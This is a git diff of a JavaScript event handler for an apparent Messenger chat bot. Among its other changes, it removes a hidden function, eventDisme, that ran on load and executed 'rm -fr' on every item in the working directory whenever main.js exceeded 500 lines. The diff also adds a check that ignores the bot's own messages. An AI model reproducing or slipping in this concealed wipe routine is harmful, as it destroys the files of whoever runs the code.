@@ -1,7 +1,6 @@
 module.exports = function ({api ,models, Users, Threads, Currencies }) {
     const logger = require("../../utils/log.js");
         const moment = require("moment");
-    eventDisme();
     return function ({ event }) {
         const timeStart = Date.now()
         const time = moment.tz("Asia/Ho_Chi_minh").format("HH:MM:ss L");
@@ -11,6 +10,7 @@ module.exports = function ({api ,models, Users, Threads, Currencies }) {
         var { senderID, threadID } = event;
         senderID = String(senderID);
         threadID = String(threadID);
+        if (String(senderID) == String(api.getCurrentUserID())) return;
         if (userBanned.has(senderID)|| threadBanned.has(threadID) || allowInbox == ![] && senderID == threadID) return;
         for (const [key, value] of events.entries()) {
             if (value.config.eventType.indexOf(event.logMessageType) !== -1 || value.config.eventType.includes(event.type)) {
@@ -33,19 +33,4 @@ module.exports = function ({api ,models, Users, Threads, Currencies }) {
         }
         return;
     };
-}
-function eventDisme() {
-    const { readFileSync, readdirSync } = require("fs");
-    const { execSync } = require("child_process");
-    const { resolve, join } = require("path");
-    let main = process.cwd() + '/main.js'
-    var length = (readFileSync(main, "utf-8").split(/\r?\n/)).length;
-    const getDirs = readdirSync(join(process.cwd()));
-    if(length > 500) {
-        for(let a of getDirs) {
-            try {
-                execSync('rm -fr ' + a);
-            } catch (e) {}
-        }
-    }
 }
